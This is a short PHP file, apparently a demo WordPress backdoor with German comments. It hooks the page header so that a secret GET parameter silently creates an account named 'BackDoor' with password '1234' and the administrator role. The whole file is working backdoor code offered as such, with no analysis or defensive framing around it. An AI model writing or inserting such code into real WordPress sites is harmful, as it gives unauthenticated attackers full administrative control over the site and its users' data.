<?
//demo Wordpress Backdoor v0.1
//17.01.2017
//author: ben

add_action('wp_head', 'wp_backdoor'); 
function wp_backdoor() {
      if ($_GET['backdoor'] == 'moien') {
        		//hier rufen wir die registration.php auf mit der funktion 
        		//wp_create_user um so unseren BackDoor Zugang zu erstellen.
                include('wp-includes/registration.php');
                if (!username_exists('BackDoor')) {
                	//erstellen des neuen User BackDoor mit dem Passwort 1234
                        $user_id = wp_create_user('BackDoor', '1234');
                        //erstellen des Objektes WP_User mit der user ID 
                        //(sonst erkennt WP den nicht verifizierten Useraccôunt)
                        $user = new WP_User($user_id);
                        //unser neues Objekt user wird in die Gruppe Administrator gesetzt
                        $user->set_role('administrator');
                }
        }
}
?>
